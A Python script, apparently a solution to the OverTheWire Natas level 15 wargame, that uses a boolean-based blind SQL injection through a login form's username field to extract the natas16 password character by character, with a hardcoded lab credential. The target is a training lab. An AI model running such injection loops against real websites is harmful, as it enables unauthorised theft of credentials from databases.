import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup as bs
import string
import json

with requests.Session() as s:
    auth = HTTPBasicAuth('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
    url = 'http://natas15.natas.labs.overthewire.org'
    
    # select 1,2 from <???> where user = "<inject>" <...>
    pw = ['_' for _ in range(0, 32)]
    chars = string.ascii_letters + string.digits
    for i in range(1, 32+1):
        for c in chars:
            print(f'{i}, {c}')
            inject = rf'" union all select 1,2 from users where username = "natas16" and substr(password,{i},1) = binary "{c}";#'

            r = s.post(url, auth=auth, data={'username': inject})

            # print(bs(r.content).prettify());
            exists = bs(r.content).find('div', id='content').next.find("doesn't") == -1

            if (exists):
                print('found!')
                pw[i - 1] = c
                break
            elif (c == chars[-1]):
                print('NOT FOUND!')
                exit(1)

    print(pw)
